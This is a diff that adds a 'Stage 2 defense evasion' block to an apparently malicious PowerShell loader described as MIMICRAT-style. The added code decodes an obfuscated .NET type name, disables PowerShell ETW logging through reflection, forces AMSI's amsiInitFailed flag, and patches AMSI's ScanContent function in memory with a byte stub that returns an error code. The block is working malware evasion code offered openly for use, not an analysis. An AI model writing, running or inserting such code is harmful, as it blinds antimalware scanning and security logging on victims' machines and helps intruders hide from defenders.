@@ -1,3 +1,55 @@
+# ============================================================
+#  Stage 2 — Defense evasion (MIMICRAT-style, $smaau wired in)
+# ============================================================
+
+# ---------- 1. Arithmetic-obfuscated type name ----------
+# Resolves to: "System.Diagnostics.Eventing.EventProvider"
+$smaau = -join [char[]] @(
+    ((669622-12345)/7919),((970544-12345)/7919),((923030-12345)/7919),
+    ((930949-12345)/7919),((812164-12345)/7919),((875516-12345)/7919),
+    ((376619-12345)/7919),((622108-12345)/7919),((780488-12345)/7919),
+    ((883435-12345)/7919),((780488-12345)/7919),((828002-12345)/7919),
+    ((812164-12345)/7919),((875516-12345)/7919),((812164-12345)/7919),
+    ((883435-12345)/7919),((930949-12345)/7919),((376619-12345)/7919),
+    ((527080-12345)/7919),((938868-12345)/7919),((930949-12345)/7919),
+    ((891354-12345)/7919),((875516-12345)/7919),((780488-12345)/7919),
+    ((930949-12345)/7919),((843840-12345)/7919),((891354-12345)/7919),
+    ((883435-12345)/7919),((376619-12345)/7919),((527080-12345)/7919),
+    ((875516-12345)/7919),((923030-12345)/7919),((843840-12345)/7919),
+    ((685460-12345)/7919),((930949-12345)/7919),((843840-12345)/7919),
+    ((867597-12345)/7919),((923030-12345)/7919)
+)
+
+# ---------- 2. ETW bypass using $smaau ----------
+try {
+    $epType = [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType($smaau)
+
+    $etwProvider = [Ref].Assembly.GetType(
+        'System.Management.Automation.Tracing.PSEtwLogProvider'
+    ).GetField('etwProvider','NonPublic,Static').GetValue($null)
+
+    if ($epType -and $etwProvider) {
+        $epType.GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider, 0)
+    }
+} catch {}
+
+# ---------- 3. AMSI bypass (amsiInitFailed) ----------
+try {
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
+        GetField('amsiInitFailed','NonPublic,Static').
+        SetValue($null, $true)
+} catch {}
+
+# ---------- 4. AMSI memory patch (ScanContent → stub) ----------
+try {
+    $scanFunc = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
+                GetMethods('NonPublic,Static') |
+                Where-Object { $_.Name -eq 'ScanContent' }
+    $patch = [byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)   # mov eax,0x80070057; ret
+    $addr  = $scanFunc.MethodHandle.GetFunctionPointer()
+    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
+} catch {}
+
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
 # ---------- Config ----------
